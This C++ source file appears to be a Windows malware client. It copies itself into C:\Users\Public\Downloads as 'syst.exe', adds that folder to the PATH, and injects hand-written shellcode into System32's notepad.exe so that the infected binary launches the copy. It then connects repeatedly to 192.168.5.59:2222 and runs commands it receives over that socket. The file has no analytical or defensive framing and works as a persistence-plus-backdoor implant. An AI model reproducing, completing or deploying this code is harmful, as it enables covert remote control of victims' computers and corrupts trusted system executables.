#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include "main.h"


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define LOCATION "C:\\Users\\Public\\Downloads\\syst.exe"
#define TARGET "C:\\Windows\\System32\\notepad.exe"

using namespace std;

void ClearWinSock() {
	WSACleanup();
}

int fileExists(TCHAR* file)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE handle = FindFirstFile(file, &FindFileData);
	int found = handle != INVALID_HANDLE_VALUE;
	if (found)
	{
		FindClose(handle);
	}
	return found;
}

int organize(){
	const char MY_SHELLCODE[] = \
		"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b"
		"\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53"
		"\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72"
		"\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81"
		"\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04"
		"\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64"
		"\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde"
		"\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde"
		"\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51"
		"\x68\x78\x65\x63\x61\x83\x6c\x24\x03\x61"
		"\x68\x57\x69\x6e\x45\x54\x53\xff\xd2\x83"
		"\xc4\x0c\x31\xc9\x51\x68\x2e\x65\x78\x65"
		"\x68\x73\x79\x73\x74\x6a\x05\x8d\x4c\x24\x04\x51\xff\xd0";
	char filename[MAX_PATH];
	char newLocation[] = LOCATION;

	BOOL stats = 0;
	DWORD size = GetModuleFileName(NULL, filename, MAX_PATH);

	CopyFile(filename, newLocation, stats);
	printf("path: %s\n", newLocation);

	Command().run_command("setx PATH ^%PATH^%;C:\\Users\\Public\\Downloads\\");

	BinaryInfection binaryInfection(TARGET, MY_SHELLCODE);
	cout << "bin: " << binaryInfection.infect() << endl;
	return 0;
}

SOCKET connecto_server(addrinfo* result){
	SOCKET socketC = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	// Connect to server.
	int status = -1;
	while (status != 0) {
		status = connect(socketC, result->ai_addr, (int)result->ai_addrlen);
		cout << "statusv2: " << status << endl;
	}
	return socketC;
}

int main() {
	if (!fileExists((TCHAR*)LOCATION)) {
		organize();
	}
	WSADATA wsaData;
	SOCKET socketC = INVALID_SOCKET;
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	Command command;

	// Initialize Winsock
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	getaddrinfo("192.168.5.59", "2222", &hints, &result);

	socketC = connecto_server(result);

	OperateSocket operateSocket(socketC);
	while(true){
		try {
			operateSocket.operate();
		}
		catch (...){}
	}

	// Closing connection
	freeaddrinfo(result);
	closesocket(socketC);
	ClearWinSock();
	system("pause");
	return 0;
}